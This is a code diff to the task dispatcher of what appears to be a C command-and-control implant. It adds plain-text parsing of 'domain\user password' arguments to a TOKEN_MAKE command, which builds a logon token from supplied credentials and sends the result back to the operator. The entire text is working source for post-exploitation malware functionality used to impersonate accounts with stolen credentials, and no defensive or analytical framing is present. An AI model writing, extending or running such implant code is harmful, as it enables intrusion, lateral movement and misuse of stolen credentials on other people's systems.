@@ -2958,9 +2958,30 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "TOKEN_MAKE") == 0) {
         char user[128]={0}, domain[128]={0}, pass[128]={0};
-        json_get_str(args,"user",user,sizeof(user),"");
-        json_get_str(args,"domain",domain,sizeof(domain),".");
-        json_get_str(args,"pass",pass,sizeof(pass),"");
+        if (args && args[0] == '{') {
+            json_get_str(args,"user",user,sizeof(user),"");
+            json_get_str(args,"domain",domain,sizeof(domain),".");
+            json_get_str(args,"pass",pass,sizeof(pass),"");
+        } else {
+            /* plain text: "domain\user pass" or "user pass" */
+            strncpy(domain,".",sizeof(domain)-1);
+            const char *sp = args ? strchr(args,' ') : NULL;
+            if (!sp) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
+            char domuser[256]={0};
+            size_t du_len = (size_t)(sp - args);
+            if (du_len >= sizeof(domuser)) du_len = sizeof(domuser)-1;
+            memcpy(domuser, args, du_len);
+            const char *bs = strchr(domuser,'\\');
+            if (bs) {
+                size_t dl = (size_t)(bs - domuser);
+                if (dl >= sizeof(domain)) dl = sizeof(domain)-1;
+                memcpy(domain, domuser, dl); domain[dl]='\0';
+                strncpy(user, bs+1, sizeof(user)-1);
+            } else {
+                strncpy(user, domuser, sizeof(user)-1);
+            }
+            strncpy(pass, sp+1, sizeof(pass)-1);
+        }
         if (!user[0] || !pass[0]) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
         char *out = token_make(user, domain, pass);
         agent_send_result(task->id, out, ""); free(out);
